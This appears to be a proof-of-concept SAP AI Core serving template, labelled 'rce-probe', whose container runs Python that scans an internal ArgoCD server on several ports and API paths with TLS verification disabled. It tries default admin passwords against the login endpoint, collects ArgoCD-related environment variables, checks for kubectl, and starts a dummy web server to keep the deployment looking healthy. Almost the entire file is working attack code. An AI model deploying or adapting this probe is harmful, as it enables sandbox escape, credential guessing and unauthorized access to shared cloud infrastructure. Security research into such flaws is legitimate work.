apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, ssl, json, socket, subprocess

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            results = {}

            ARGOCD_IP = '100.107.174.75'
            ARGOCD_HOST = 'argocd-server.argocd.svc.cluster.local'

            # --- Try ArgoCD API endpoints directly (bypass SAP layer) ---
            # ArgoCD REST API uses port 8080 (HTTP) or 8443 (HTTPS/gRPC)
            # Let's try all ports with GET and see what responds
            for port in [80, 443, 8080, 8443]:
                for path in ['/healthz', '/api/v1/session', '/api/v1/applications', '/api/version', '/api/v1/clusters', '/api/v1/projects']:
                    for scheme in ['http', 'https']:
                        url = f'{scheme}://{ARGOCD_IP}:{port}{path}'
                        try:
                            req = urllib.request.Request(url, headers={'Host': ARGOCD_HOST})
                            with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                                body = r.read(2000).decode(errors='replace')
                                results[f'GET_{scheme}_{port}{path}'] = {'code': r.status, 'body': body[:500]}
                        except urllib.error.HTTPError as e:
                            body = ''
                            try: body = e.read(500).decode(errors='replace')
                            except: pass
                            results[f'GET_{scheme}_{port}{path}'] = {'code': e.code, 'body': body[:200]}
                        except Exception as e:
                            err = str(e)[:60]
                            if 'timed out' not in err and '111' not in err and '104' not in err:
                                results[f'GET_{scheme}_{port}{path}'] = {'err': err}

            # --- ArgoCD login attempt (port 8080) ---
            for admin_pass in ['admin', 'password', 'argocd', '']:
                try:
                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
                    req = urllib.request.Request(
                        f'http://{ARGOCD_IP}:8080/api/v1/session',
                        data=login_data,
                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
                        method='POST')
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                        body = r.read(500).decode(errors='replace')
                        results[f'login_8080_{admin_pass}'] = {'code': r.status, 'body': body}
                except urllib.error.HTTPError as e:
                    body = ''
                    try: body = e.read(200).decode(errors='replace')
                    except: pass
                    results[f'login_8080_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
                except Exception as e:
                    results[f'login_8080_{admin_pass}'] = {'err': str(e)[:60]}

            # --- ArgoCD HTTPS login (port 443) ---
            for admin_pass in ['admin', 'password', 'argocd', '']:
                try:
                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
                    req = urllib.request.Request(
                        f'https://{ARGOCD_IP}:443/api/v1/session',
                        data=login_data,
                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
                        method='POST')
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                        body = r.read(500).decode(errors='replace')
                        results[f'login_443_{admin_pass}'] = {'code': r.status, 'body': body}
                except urllib.error.HTTPError as e:
                    body = ''
                    try: body = e.read(200).decode(errors='replace')
                    except: pass
                    results[f'login_443_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
                except Exception as e:
                    results[f'login_443_{admin_pass}'] = {'err': str(e)[:60]}

            # --- Check if ARGOCD_AGENT_SERVER_ADDR env var is set or any ArgoCD-related env ---
            import os
            argocd_env = {k: v for k, v in os.environ.items() if 'ARGO' in k.upper() or 'ARGOCD' in k.upper()}
            results['argocd_env'] = argocd_env if argocd_env else 'none'

            # --- Check if kubectl is available ---
            try:
                out = subprocess.check_output(['kubectl', 'version', '--client'], stderr=subprocess.STDOUT)
                results['kubectl'] = out.decode()[:100]
            except Exception as e:
                results['kubectl'] = 'ERR: ' + str(e)[:50]

            # --- Try to access ArgoCD via its gRPC port with raw socket ---
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ARGOCD_IP, 8443))
                # Send HTTP/1.1 GET to see if it responds with anything
                s.send(b'GET /api/version HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n')
                import time; time.sleep(1)
                resp = s.recv(1000)
                s.close()
                results['argocd_8443_raw'] = resp.decode(errors='replace')[:300]
            except Exception as e:
                results['argocd_8443_raw'] = 'ERR: ' + str(e)[:80]

            print('[ARGOCD_START]')
            print(json.dumps(results, indent=2))
            print('[ARGOCD_END]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
